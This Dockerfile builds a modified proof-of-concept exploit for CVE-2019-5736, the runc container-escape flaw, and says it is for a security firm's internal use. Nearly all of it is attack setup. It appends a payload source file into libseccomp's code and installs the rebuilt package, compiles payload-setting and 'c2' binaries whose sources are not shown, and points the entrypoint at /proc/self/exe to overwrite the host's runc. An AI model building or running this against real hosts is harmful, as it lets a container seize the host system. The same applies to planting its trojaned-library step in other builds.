#
# ==========================================
# File: Dockerfile
# Author: Matthew Stacks & Brian Nelson
# Organization: Rendition Infosec
# Source Author: q3k
# Description: Modified PoC of CVE-2019-5736 for internal use by Rendition Infosec
#
# This Dockerfile performs four jobs:
#
# -- Builds a Docker image
#
# -- Adds and compiles payloadstage.c, payloadset.c, and c2.c for use within that Docker image
#
# -- Defines the entrypoint, or the command and parameters that will be executed first when a container is run. 
#        Any command line arguments passed to docker run <image> will be appended to the entrypoint command, 
#        and will override all elements specified using CMD. For example: 
# 
#        docker run <image> /bin/bash will add the command argument /bin/bash to the end of the entrypoint.
#
# -- Creates a symbolic link between /proc/self/exe and /entrypoint
# 
# ==========================================

FROM ubuntu:18.04
LABEL Description: Modified PoC of CVE-2019-5736 for internal use by Rendition Infosec

RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp

ADD payloadstage.c /root/payloadstage.c

RUN set -e -x ;\
    cd /root/libseccomp-2.3.1 ;\
    cat /root/payloadstage.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb

ADD payloadset.c /root/payloadset.c

RUN set -e -x ;\
    cd /root ;\
    gcc payloadset.c -o /payloadset

ADD c2.c /root/c2.c

RUN set -e -x ;\
    cd /root ;\
    gcc c2.c -o /c2

ENTRYPOINT [ "/entrypoint" ]

RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
